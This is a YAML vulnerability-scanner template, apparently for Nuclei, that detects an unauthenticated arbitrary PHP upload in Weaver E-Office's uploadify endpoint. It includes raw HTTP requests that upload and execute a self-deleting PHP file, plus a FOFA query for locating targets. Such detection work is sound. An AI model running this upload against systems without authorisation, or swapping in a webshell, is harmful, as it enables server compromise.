id: weaver-uploadify-file-upload

info:
  name: OA E-Office Uploadify - Arbitrary - 任意文件上传漏洞
  author: SleepingBag945
  severity: critical
  description: |
    该模板用于检测 OA E-Office Uploadify - Arbitrary - 任意文件上传漏洞。该类漏洞通常源于上传接口缺少认证、文件类型校验、存储隔离或执行权限控制。模板会向 `/general/weibo/javascript/uploadify/uploadify.php`、`/attachment/personal/_temp.php` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可能上传脚本、WebShell 或恶意文件，并借此执行代码或长期控制服务器。
    - 上传目录若可被访问或解析，可能导致数据篡改、恶意内容投递和业务系统被接管。
  remediation: |
    - 为上传接口增加认证授权和 CSRF 防护，限制可上传文件类型、大小和扩展名。
    - 在服务端校验文件内容与 MIME 类型，将上传文件存储到不可执行目录并使用随机文件名。
    - 清理异常上传文件，复核上传目录解析配置、访问日志和可疑账号活动。
  reference:
    - https://github.com/w-digital-scanner/w9scan/blob/master/plugins/weaver_oa/2158.py
  classification:
    cpe: cpe:2.3:a:weaver:e-office:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: weaver
    product: e-office
    fofa-query: app="泛微-EOffice"
  tags: weaver,e-office,oa,intrusive,rce,fileupload,vuln
variables:
  filename: "{{to_lower(rand_base(5))}}"
  string: "weaver-uploadify-file-upload"

http:
  - raw:
      - |
        GET /general/weibo/javascript/uploadify/uploadify.php HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /general/weibo/javascript/uploadify/uploadify.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
        Accept: */*
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjetvpuye
        Accept-Encoding: gzip

        ------WebKitFormBoundaryjetvpuye
        Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.php"
        Content-Type: application/octet-stream

        <?php echo md5("{{string}}");unlink(__FILE__);?>
        ------WebKitFormBoundaryjetvpuye--
      - |
        GET /attachment/personal/_temp.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "contains(body_2, 'imageSrc') && contains(body_2, 'height')"
        condition: and

      - type: word
        part: body_3
        words:
          - '{{md5(string)}}'
